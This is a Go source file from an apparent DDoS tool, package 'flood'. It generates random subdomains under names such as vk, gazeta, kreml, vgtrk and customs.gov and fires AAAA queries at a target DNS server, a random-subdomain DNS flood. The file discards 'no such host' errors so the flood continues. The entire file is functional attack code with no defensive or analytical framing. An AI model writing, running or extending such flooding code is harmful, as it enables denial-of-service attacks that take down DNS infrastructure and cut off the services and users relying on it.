package flood

import (
	"context"
	"math/rand"
	"strings"

	"github.com/miekg/dns"
)

const charset = "abcdefghijklmnopqrstuvwxyz"

var (
	domains = []string{"com", "ru", "info", "co", "rus", "ch", "gov"}
	sub     = []string{"vk", "gazeta", "kreml", "vgtrk", "mail", "customs.gov", "gov"}
)

func stringWithCharset(length int, charset string) string {
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func randomDomain() string {
	parts := []string{}

	for i := 0; i < 1+rand.Intn(3); i++ {
		parts = append(parts, stringWithCharset(3+rand.Intn(15), charset))
	}
	parts = append(parts, sub[rand.Intn(len(sub))])
	parts = append(parts, domains[rand.Intn(len(domains))])
	return strings.Join(parts, ".")
}

func (t *Target) performDNS(ctx context.Context, addr string) error {
	d := &dns.Msg{}
	d.SetQuestion(randomDomain()+".", dns.TypeAAAA)
	_, _, err := t.dnsClient.Exchange(d, strings.Replace(addr, "dns://", "", 1))

	if err != nil && !strings.HasSuffix(err.Error(), "no such host") {
		return err
	}

	return nil
}
